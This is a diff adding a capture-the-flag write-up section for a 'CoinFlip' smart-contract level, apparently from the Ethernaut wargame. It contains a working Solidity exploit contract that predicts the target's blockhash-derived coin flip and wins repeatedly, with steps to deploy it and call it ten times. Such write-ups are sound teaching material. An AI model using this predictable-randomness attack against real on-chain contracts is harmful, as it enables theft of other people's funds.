@@ -69,6 +69,39 @@ Submit Instance
 
 ```☜Ҩ.¬_¬.Ҩ☞ Well done, You have completed this level!!!```
 
+## 3. CoinFLip
+
+```
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.0;
+
+import "./CoinFlip.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";
+
+contract Win {
+    
+    using SafeMath for uint256;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    CoinFlip public coinflip;
+    constructor(address conFlipAddress) public {
+        coinflip = CoinFlip(conFlipAddress);
+    }
+    // address public coinflip_add = 0x0Fd8F81a893762013486d74b6b61fA0704d07D4b;
+    
+    function _guess() public {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+        uint256 coinFlip = blockValue.div(FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+        coinflip.flip(side);
+    }
+}
+```
+Copy the Coin Flip contract into CoinFlip.sol and deploy win.sol. Call _guess() 10 times.
+
+> contract.consecutiveWins()
+
+
 
 
 
